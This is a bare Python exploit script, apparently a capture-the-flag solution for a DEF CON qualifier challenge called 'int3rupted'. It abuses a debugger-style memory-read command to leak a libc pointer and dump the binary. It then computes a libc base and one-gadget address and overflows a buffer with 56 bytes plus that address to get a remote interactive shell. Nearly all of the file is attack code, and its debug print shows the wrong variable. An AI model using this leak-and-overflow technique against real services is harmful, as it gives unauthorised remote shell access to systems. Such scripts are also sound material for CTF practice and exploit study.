from pwnpwnpwn import *

host = "int3rupted_3bb8f10793b82841c44a366eb9f27223.quals.shallweplayaga.me"
port = 0xcccc
sock = make_conn(host,port)
libc_start = 0x603058

def dumpbinary(sock,addr,size):
    f = open("rr","wa")
    recvuntil(sock,">")
    for i in range(addr,size,0x40):
        sendline(sock,"db " + hex(i))
        data = recvuntil(sock,">")[1:-1]
        f.write(data)
    f.close()

def leak(sock,addr):
    recvuntil(sock,">")
    sendline(sock,"db " + hex(addr))
    result =  recvuntil(sock,">").split()[1:8]
    result = result[::-1]
    return "".join(result)

def shell(sock,addr):
    sendline(sock,"g")
    sock.recv(2048)
    sendline(sock,"b"*56+pack(addr)) 
    inter(sock)

start_offset = int(leak(sock,libc_start),16)
libcbase = start_offset - 0x21dd0
gadget = libcbase + 0xe58c5
print "libcbase: %016x" % libc_start
shell(sock,gadget)
